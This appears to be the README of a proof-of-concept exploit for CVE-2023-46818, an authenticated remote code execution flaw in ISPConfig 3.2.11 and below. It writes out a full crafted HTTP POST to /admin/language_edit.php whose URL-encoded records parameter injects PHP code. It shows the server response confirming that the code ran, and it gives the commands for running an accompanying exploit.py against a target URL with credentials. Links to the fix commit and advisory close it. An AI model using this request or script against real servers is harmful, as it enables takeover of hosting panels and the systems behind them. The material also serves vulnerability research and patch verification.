## CVE-2023-46818
### Description
ISPCONFIG 3.2.11 and below allows remote authenticated users to execute arbitrary code via a crafted POST request to the `/admin/language_edit.php` URI.

### How to Reproduce
#### Request

``` 
    POST /admin/language_edit.php HTTP/2
    Host: <url>
    Cookie: ISPCSESS=<admin_session>
    Content-Length: 195
    Sec-Ch-Ua-Platform: "macOS"
    Accept-Language: en-US,en;q=0.9
    Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
    Sec-Ch-Ua-Mobile: ?0
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
    Accept: text/html, */*; q=0.01
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    lang=en&module=help&id=0&lang_file=FCsmKTvP.lng&_csrf_id=<csrf_id>&_csrf_key=<csrf_key>&records%5B%5C%5D=%27%5D%3Becho+4%2b4%3Bdie%3B%23
```
#### Response
```
    HTTP/2 200 OK
    Date: Tue, 01 Mar 2023 00:00:00 GMT
    Server: Apache/2.4.51 (Ubuntu)
    X-Powered-By: PHP/7.4.3
    Content-Length: 0
    Keep-Alive: timeout=5, max=100
    Connection: Keep-Alive
    Content-Type: text/html; charset=UTF-8

    8 
```

### How to Exploit
```
    python3 -m venv venv && source venv/bin/activate
    pip install -r requirements.txt
    python3 exploit.py https://<url> <username> <password> <proxy>(optional)
```

### Reference
- [Fix Commit](https://git.ispconfig.org/ispconfig/ispconfig3/-/commit/1d027303f4c2aa546a1dc31e005270647c974a2e)
- [GHSA-qfc7-gwmc-9vvr](https://github.com/advisories/GHSA-qfc7-gwmc-9vvr)
